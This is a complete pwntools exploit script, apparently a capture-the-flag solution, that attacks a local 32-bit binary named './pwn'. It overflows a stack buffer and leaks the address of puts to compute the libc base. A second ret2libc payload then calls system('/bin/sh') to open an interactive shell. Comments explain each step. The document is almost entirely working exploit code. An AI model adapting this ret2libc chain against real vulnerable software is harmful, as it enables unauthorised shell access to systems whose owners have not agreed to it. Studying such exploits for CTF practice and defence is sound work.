#!/bin/python3
from pwn import *

# context.log_level = 'DEBUG'
p = process('./pwn')
e = ELF('./pwn')
l = ELF('/lib/i386-linux-gnu/libc.so.6')

offset = 0xffc2122c - 0xffc211a0

p.recvuntil(b"desert: \n")


# payload overwrites buffer, calls puts to leak puts addr, and loops back to main
# this payload is purely for leaking the libc. Once we've done that, we loop back to main and use that to do a ropchain
# we put puts@got after main, because the parameter is passed after the return address
payload = b'A'*offset
payload += p32(e.plt['puts'])
payload += p32(e.sym['main'])
payload += p32(e.got['puts']) # this is the func we're leaking

p.sendline(payload)

libc_puts_leaked = u32(p.recvline()[:4])

# Using this leaked address, we can put it into this website: https://libc.blukat.me/
# We can type in `puts` for the function and the given address, and it tells us which libc is being used for the binary
log.info(f'Got puts libc address: {hex(libc_puts_leaked)}')


libc_puts_offset = l.sym['puts']
libc_base = libc_puts_leaked - libc_puts_offset

# libc base should have 3 zeros at the end
log.info(f'Libc Base: {hex(libc_base)}')
if hex(libc_base)[-3:] != '000':
	log.info('Libc base hex addr should be aligned to a 0x1000 pagesize')
	log.failure('Libc base is not correct! Exiting now')
	p.close()
	exit()
else:
	log.info('Libc Base address looks correct!')

# Because we looped _back_ to main, there is a different offset than last
# I got the 8 value through trial and error.
newOffset = offset - 8

# This is the real exploit
system_offset = l.sym['system']
system_addr = libc_base + system_offset

binsh_offset = next(l.search(b'/bin/sh'))
binsh_addr = libc_base + binsh_offset

payload = b'A'*newOffset
payload += p32(system_addr)
payload += p32(e.sym['main']) # This is the ret addr for when we finish calling system(). I made it jump to main, but you could just give some filler bytes
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()

p.close()
